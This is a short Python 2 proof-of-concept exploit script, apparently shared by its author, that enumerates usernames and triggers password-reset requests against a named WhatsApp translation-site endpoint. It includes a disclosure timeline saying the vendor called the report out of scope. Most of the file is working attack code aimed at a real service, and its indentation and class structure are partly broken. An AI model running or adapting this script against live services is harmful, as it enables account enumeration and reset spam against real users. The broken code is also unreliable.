#!/usr/bin/env python

##!!##

####################################################################			
#														   		                                 #	
# REPORTED But NOT RESOLVED {FB RESPONSE : out of scope :( "Sad"}  #	
#														   		                                 #
####################################################################

##
# Discovered and POC coded by Chaitnaya Haritash
##

##
# Information :
##

#--Vendor : Facebook
#--Application : WhatsApp (URL) 
#--Vulnerable URL :  https://translate.whatsapp.com/reset-request?username=
#--Severity according to my opinion : IDK
#--Tested on : 
#              OS :Ubuntu 14.0 (backbox)
#              Browser : Chrome
#--Python 2.7.x 
#--Video : https://drive.google.com/open?id=0B-b5V6U97QTyOEdoZEo0UTNTWG8
#-- Timeline : 
#				Discovered      : 28/oct/2016
#				Reported        : 29/oct/2016  
#				Response (fb)   : 03/nov/2016 (out of scope)

#NOTE!!! User will be responsible for his actions

##!!## 

import os,sys,urllib,time,requests
from bs4 import BeautifulSoup


if os.name == 'posix':
	os.system ('clear')
else:
	os.system('cls')
  print "I supports linux only byee :("
  exit()

banner = '''

================================================
Whatsapp Username enumeration + Spamming - POC
|
Exploit Coded by Chaitanya {twitter/@Indi_G34r}
================================================

usage : ./exploit.py 

'''

print banner


class Exploit:
	def __init__(self,):
		print ""
	def damn(self,):

			print ""

if __name__ == "__main__":

			
			print ""
			private = str(raw_input('Username > '))
			whatsapp = "https://translate.whatsapp.com/reset-request?username="+str(private)
			done = urllib.urlopen(whatsapp)
			print ""
			print "[*] Please Wait :) [*]"
			print ""
			r = requests.get(whatsapp)
			soup = BeautifulSoup(r.content, "lxml")
			
			try :
				t_data = soup.find_all("div", {"class": "page-header"})
				for item in t_data:
					print item.text
			except :
				g_data = soup.find_all("div", {"class": "alert alert-error"})
				for item in g_data:
					print item.text

			finally:
				print "[+] Exiting [+]"      			 		

Exploit()




